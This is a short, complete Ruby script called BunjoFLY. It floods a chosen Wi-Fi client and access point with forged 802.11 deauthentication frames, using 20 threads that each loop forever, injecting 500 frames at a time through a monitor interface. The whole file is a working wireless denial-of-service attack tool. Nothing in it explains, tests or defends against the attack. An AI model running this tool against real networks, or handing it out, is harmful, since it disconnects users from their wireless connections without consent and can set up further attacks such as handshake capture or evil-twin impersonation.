#!/usr/bin/env ruby
require 'packetgen'
require 'optparse'
require 'eventmachine'

class BunjoFLY
  def initialize
    @params = {
      bssid: nil,
      client: nil,
      iface: nil,
      size: 500,
    }

    @threads = Array.new
  end

  def option_parser
    OptionParser.new do |opts|
      opts.on("--bssid BSSID") do |bssid|
        @params[:bssid] = bssid
      end

      opts.on("--client CLIENT") do |client|
        @params[:client] = client
      end

      opts.on("--iface IFACE") do |iface|
        @params[:iface] = iface
      end
    end.parse!
  end

  def send_deauth
    loop do
      pkt = PacketGen.gen('RadioTap').
        add('Dot11::Management', mac1: @params[:client], mac2: @params[:bssid], mac3: @params[:bssid]).
        add('Dot11::DeAuth', reason: 7)

      pkt.to_w(@params[:iface], calc: true, number: @params[:size], interval: 0.2)
    end
  end

  def main
    puts("IFACE: #{@params[:iface]}")
    puts("BSSID: #{@params[:bssid]}")
    puts("CLIENT: #{@params[:client]}")
    puts("SIZE: #{@params[:size]}")

    puts "Sending Deauth Packets..."

    20.times do
      @threads << Thread.new { send_deauth }
    end

    @threads.each(&:join)
    EM.stop
  end
end

EM.run do
  begin
    bunjofly = BunjoFLY.new
    bunjofly.option_parser
    bunjofly.main
  rescue => err
    puts("ERROR: #{err}")
  end
end
